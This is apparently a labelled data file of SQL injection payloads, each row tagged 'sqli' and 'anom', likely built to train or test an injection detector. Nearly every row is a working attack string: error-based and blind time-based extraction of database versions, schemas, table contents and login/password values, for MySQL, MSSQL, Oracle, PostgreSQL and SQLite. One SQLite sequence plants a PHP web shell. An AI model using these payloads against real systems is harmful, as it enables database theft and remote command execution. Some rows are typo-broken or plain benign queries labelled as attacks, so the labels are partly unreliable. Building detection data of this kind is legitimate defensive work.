"(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))",sqli,anom
"'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'",sqli,anom
"AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-",sqli,anom
"AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--",sqli,anom
"AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--",sqli,anom
"AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--",sqli,anom
"AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--",sqli,anom
"' and updatexml(null,concat(0x0a,version()),null)-- -",sqli,anom
"' and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -",sqli,anom
"?id=1 AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--",sqli,anom
"?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--",sqli,anom
"?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--",sqli,anom
"?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--",sqli,anom
"?id=1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--",sqli,anom
"convert(int,@@version)",sqli,anom
cast((SELECT @@version) as int),sqli,anom
"' + convert(int,@@version) + '",sqli,anom
' + cast((SELECT @@version) as int) + ',sqli,anom
SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual,sqli,anom
"SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual",sqli,anom
"SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual",sqli,anom
"SELECT to_char(dbms_xmlgen.getxml('select ""'||(select user from sys.dual)||'"" FROM sys.dual')) FROM dual",sqli,anom
"SELECT rtrim(extract(xmlagg(xmlelement(""s"", username || ',')),'/s').getstringval(),',') FROM all_users",sqli,anom
",cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)",sqli,anom
",cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--",sqli,anom
",cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--",sqli,anom
",cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)",sqli,anom
"' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1",sqli,anom
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1,sqli,anom
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1,sqli,anom
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1,sqli,anom
SELECT name FROM master..sysdatabases,sqli,anom
SELECT name FROM Injection..sysobjects WHERE xtype = 'U',sqli,anom
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users'),sqli,anom
"SELECT  UserId, UserName from Users",sqli,anom
"1' UNION SELECT 1,2,3--+",sqli,anom
"1' UNION SELECT @,@,@--+",sqli,anom
SELECT @@version WHERE @@version LIKE '%12.0.2000.8%',sqli,anom
"WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)",sqli,anom
SELECT message FROM data WHERE row = 1 and message like 't%',sqli,anom
"?id=1 and substring(version(),1,1)=5",sqli,anom
"?id=1 and right(left(version(),1),1)=5",sqli,anom
"?id=1 and left(version(),1)=4",sqli,anom
"?id=1 and ascii(lower(substr(Version(),1,1)))=51",sqli,anom
"?id=1 and (select mid(version(),1,1)=4)",sqli,anom
"?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'",sqli,anom
"?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'",sqli,anom
"2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",sqli,anom
"2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2",sqli,anom
"AND MAKE_SET(YOLO<(SELECT(length(version()))),1)",sqli,anom
"AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)",sqli,anom
"AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)",sqli,anom
"AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)",sqli,anom
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';,sqli,anom
SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';,sqli,anom
SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual),sqli,anom
SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);,sqli,anom
SELEC COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';,sqli,anom
SELEC message FROM log_table WHERE rownum=1 AND message LIKE 't%';,sqli,anom
ProductID=1;waitfor delay '0:0:10'--,sqli,anom
ProductID=1);waitfor delay '0:0:10'--,sqli,anom
ProductID=1';waitfor delay '0:0:10'--,sqli,anom
ProductID=1');waitfor delay '0:0:10'--,sqli,anom
ProductID=1));waitfor delay '0:0:10'--,sqli,anom
IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]',sqli,anom
"+BENCHMARK(40000000,SHA1(1337))+",sqli,anom
"'%2Bbenchmark(3200,SHA1(1))%2B'",sqli,anom
"AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1",sqli,anom
RLIKE SLEEP([SLEEPTIME]),sqli,anom
"OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))",sqli,anom
1 and (select sleep(10) from dual where database() like '%')#,sqli,anom
1 and (select sleep(10) from dual where database() like '___')# ,sqli,anom
1 and (select sleep(10) from dual where database() like '____')#,sqli,anom
1 and (select sleep(10) from dual where database() like '_____')#,sqli,anom
1 and (select sleep(10) from dual where database() like 'a____')#,sqli,anom
1 and (select sleep(10) from dual where database() like 's____')#,sqli,anom
1 and (select sleep(10) from dual where database() like 'sa___')#,sqli,anom
1 and (select sleep(10) from dual where database() like 'sw___')#,sqli,anom
1 and (select sleep(10) from dual where database() like 'swa__')#,sqli,anom
1 and (select sleep(10) from dual where database() like 'swb__')#,sqli,anom
1 and (select sleep(10) from dual where database() like 'swi__')#,sqli,anom
"1 and (select sleep(10) from dual where (select table_name from information_schema.columns where table_schema=database() and column_name like '%pass%' limit 0,1) like '%')#",sqli,anom
"?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1)))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --",sqli,anom
"?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1)))>=100, 1, SLEEP(3)) --",sqli,anom
"?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",sqli,anom
"AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",sqli,anom
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])),sqli,anom
"AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))     ",sqli,anom
ATTACH DATABASE '/var/www/lol.php' AS lol;,sqli,anom
CREATE TABLE lol.pwn (dataz text);,sqli,anom
INSERT INTO lol.pwn (dataz) VALUES ('<?system($_GET['cmd']); ?>');--     ,sqli,anom
SELECT @@version,sqli,anom
SELECT DB_NAME(),sqli,anom
SELECT name FROM master..sysdatabases;,sqli,anom
"SELECT DB_NAME(N); — for N = 0, 1, 2, …",sqli,anom
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only,sqli,anom
"SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable",sqli,anom
"SELECT table_catalog, column_name FROM information_schema.columns",sqli,anom
